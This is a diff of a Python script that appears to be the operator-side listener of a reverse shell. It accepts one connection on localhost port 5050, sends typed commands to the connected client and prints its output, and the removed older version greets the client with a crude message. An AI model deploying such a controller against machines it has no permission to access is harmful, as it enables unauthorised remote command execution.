@@ -1,41 +1,54 @@
 import socket
+import sys
 
-SERVER_HOST = "localhost"
-SERVER_PORT = 5050
-
-
-BUFFER_SIZE = 1024
-
-s = socket.socket()
-s.bind((SERVER_HOST, SERVER_PORT))
-
-s.listen(5)
-print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
-
-client_socket , client_address = s.accept()
-print(f"{client_address[0]}:{client_address[1]} Connected")
-
-
-message = "Hello firend this is your fucker".encode("utf-8")
-
-client_socket.send(message)
-
-while True:
-    shell = ''
+def send_commands(s, conn):
+    """Get a command from the user and send it to the client."""
+    print("\nCtrl + C to kill the connection.\n")
+    # test 
+    data1 = conn.recv(4096).decode()
     
-    results = client_socket.recv(BUFFER_SIZE).decode("utf-8")
-    if "cwd=" in results:
-        x = results.split("=")
-        shell = x[1]
-        command = input(f"{shell}>")
-        if command.lower() == "exit":
-            break
-        client_socket.send(command.encode("utf-8"))
-    else:
-        print(results)
+    # ------
+    print(f"{data1}", end="")
+    while True:
+        try:
+            cmd = input()
+            if len(cmd) > 0:
+                conn.sendall(cmd.encode())
+                data = conn.recv(4096) # avaz nashe, high capacity
+                print(data.decode("utf-8"), end="")
+        except KeyboardInterrupt:
+            print("\nGoodbye.")
+            conn.close()
+            sys.exit()
+        except Exception as e:
+            print(e)
+            conn.close()
+            e.close()
+            sys.exit()
 
+def server(address):
+    """Initialize a socket server and wait for connections."""
+    try:
+        s = socket.socket()
+        s.bind(address)
+        s.listen()
+        print("Server Initialized. I'm listening...")
+    except Exception as e:
+        print("\nIt seems like something went wrong.")
+        print(e)
+        restart = input("\nDo you want me to reinitialize the server? y/n ")
+        if restart.lower() == "y" or restart.lower() == "yes":
+            print("\nRoger That. Reinitializing the server...\n")
+            server(address)
+        else:
+            print("\nSo Long, and Thanks for All the Fish.\n")
+            sys.exit()
+    conn, client_addr = s.accept()
+    print(f"Connection Established: {client_addr}")
+    send_commands(s, conn)
 
-client_socket.close()
-s.close()
-
-
+if __name__ == "__main__":
+    host = "127.0.0.1"
+    port = 5050
+    server((host, port))
+        
